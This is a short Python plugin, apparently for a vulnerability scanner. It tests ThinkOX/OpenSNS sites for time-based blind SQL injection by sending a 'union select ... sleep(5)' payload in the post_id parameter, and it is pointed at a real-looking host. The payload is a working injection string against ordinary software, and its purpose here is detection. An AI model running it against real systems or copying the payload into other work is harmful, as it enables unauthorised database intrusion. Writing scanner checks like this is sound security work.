# !/usr/bin/dev python
# -*- coding:utf-8 -*-

"""
referer:
http://www.wooyun.org/bugs/wooyun-2010-087529
"""
import time


def assign(service, args):
    if service == 'thinkox':
        return True, args


def audit(args):
    verify_url = '%sindex.php' % args
    payload = '?s=/group/index/recommend/post_id/-1)%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,sleep(5)%23.html '
    start_time = time.time()
    code, _, _, _, _ = curl.curl(verify_url + payload)
    if code == 200 and (time.time() - start_time > 4):
        security_hole(verify_url)

if __name__ == "__main__":
    from dummy import *
    audit(assign('thinkox', 'http://dev.opensns.cn/')[1])